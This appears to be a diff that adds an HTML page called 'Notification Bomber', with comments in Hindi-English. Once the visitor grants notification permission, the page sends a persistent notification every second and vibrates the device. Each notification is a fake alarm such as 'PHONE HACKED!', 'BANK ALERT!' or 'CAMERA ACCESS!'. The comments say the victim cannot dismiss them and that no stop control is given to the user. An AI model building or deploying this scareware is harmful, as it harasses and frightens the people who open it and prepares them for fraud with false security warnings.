@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>💣 Notification Bomber</title>
+    <style>
+        body {
+            background: #000;
+            color: red;
+            font-family: monospace;
+            text-align: center;
+            padding: 50px;
+            animation: blink 0.1s infinite;
+        }
+        @keyframes blink {
+            0%,100%{background:#000}
+            50%{background:#8b0000}
+        }
+        h1 { font-size: 50px; margin: 30px; }
+        .counter {
+            font-size: 80px;
+            font-weight: bold;
+            color: #ff0;
+        }
+        button {
+            background: red;
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            font-size: 30px;
+            border-radius: 10px;
+            margin: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>💣 NOTIFICATION BOMBER</h1>
+    <div class="counter" id="count">0</div>
+    <button onclick="startBomb()">💥 START BOMB 💥</button>
+
+    <script>
+        let bombInterval;
+        let count = 0;
+
+        async function startBomb() {
+            // Pehle notification permission lo
+            const perm = await Notification.requestPermission();
+            
+            if(perm === 'granted') {
+                // Bomb start!
+                bombInterval = setInterval(() => {
+                    count++;
+                    document.getElementById('count').textContent = count;
+                    
+                    // Different scary messages
+                    const messages = [
+                        { title: '⚠️ VIRUS DETECTED!', body: '3 malware found!' },
+                        { title: '🔴 PHONE HACKED!', body: 'Your data is being stolen!' },
+                        { title: '💀 SYSTEM CRITICAL!', body: 'Formatting drive C:' },
+                        { title: '📱 BANK ALERT!', body: 'Unauthorized transaction!' },
+                        { title: '🕵️ CAMERA ACCESS!', body: 'Someone is watching you!' },
+                        { title: '🔊 MICROPHONE ACTIVE!', body: 'Recording audio...' },
+                        { title: '📍 LOCATION TRACKED!', body: 'Your position shared!' },
+                        { title: '📸 PHOTO UPLOADED!', body: 'Gallery being uploaded!' }
+                    ];
+                    
+                    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                    
+                    // Notification bhejo
+                    new Notification(randomMsg.title, {
+                        body: randomMsg.body,
+                        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ff0000\'/%3E%3Ctext x=\'50\' y=\'70\' font-size=\'70\' text-anchor=\'middle\' fill=\'white\'%3E💀%3C/text%3E%3C/svg%3E',
+                        vibrate: [500, 200, 500, 200, 500], // Vibration pattern
+                        requireInteraction: true, // User dismiss nahi kar sakta
+                        tag: 'bomb-' + Date.now() // Har notification unique
+                    });
+                    
+                    // Phone vibrate (agar support kare to)
+                    if('vibrate' in navigator) {
+                        navigator.vibrate([500, 200, 500, 200, 500]);
+                    }
+                    
+                }, 1000); // Har second
+            }
+        }
+
+        // Stop button (hacker ke liye)
+        // User ke liye nahi!
+    </script>
+</body>
+</html>
